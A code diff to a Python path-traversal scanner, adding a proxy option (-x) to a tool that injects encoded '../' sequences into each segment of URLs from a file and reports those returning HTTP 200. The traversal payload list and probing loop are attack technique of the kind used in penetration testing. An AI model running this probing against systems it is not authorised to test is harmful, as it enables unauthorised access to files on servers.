@@ -3,9 +3,13 @@ import requests, sys, getopt, os.path, re
 
 travenc = ["../", "%2e./", ".%2e/", "%2e.%2f", ".%2e%2f", "..%2f", "%2e%2e%2f"]
 
-def send_requests_per_path(base, path, enp, header):
+def send_requests_per_path(base, path, enp, header, proxy):
     path_comp = path.split('/')[1:]
-    org_req = requests.urllib3.PoolManager().request("GET", base+path[1:], headers=header)
+    if proxy != '':
+        manager=requests.urllib3.ProxyManager(proxy)
+    else:
+        manager=requests.urllib3.PoolManager()
+    org_req = manager.request("GET", base+path[1:], headers=header)
     org_resp_code = org_req.status
 
     for inj_point in range(len(path_comp)):
@@ -18,7 +22,7 @@ def send_requests_per_path(base, path, enp, header):
                 probe = enp[1:]
             
             url=base+'/'.join(path_comp[:inj_point+1])+'/'+traversal+probe
-            r = requests.urllib3.PoolManager().request("GET",url, headers=header)
+            r = manager.request("GET",url, headers=header)
             if r.status == 200:
                 print(str(r.status) + ": " + url)
 
@@ -31,8 +35,9 @@ def main(argv):
     endpoint = ''
     paths_file = ''
     headers = {}
+    proxy = ''
     try:
-        opts, args = getopt.getopt(argv,"hu:p:e:H:")
+        opts, args = getopt.getopt(argv,"hu:p:e:H:x:")
     except getopt.GetoptError:
         print_help()
         sys.exit(2)
@@ -54,6 +59,8 @@ def main(argv):
                 print("Header already set you fool!")
                 sys.exit(2)
             headers[s.group(1)]=s.group(2)
+        elif opt == '-x':
+            proxy = arg
 
     if baseurl == '' or paths_file == '':
         print_help()
@@ -61,7 +68,7 @@ def main(argv):
 
     pf = open(paths_file)
     for line in pf:
-        send_requests_per_path(baseurl, line[:-1], endpoint, headers)
+        send_requests_per_path(baseurl, line[:-1], endpoint, headers, proxy)
     
 
 if __name__ == "__main__":
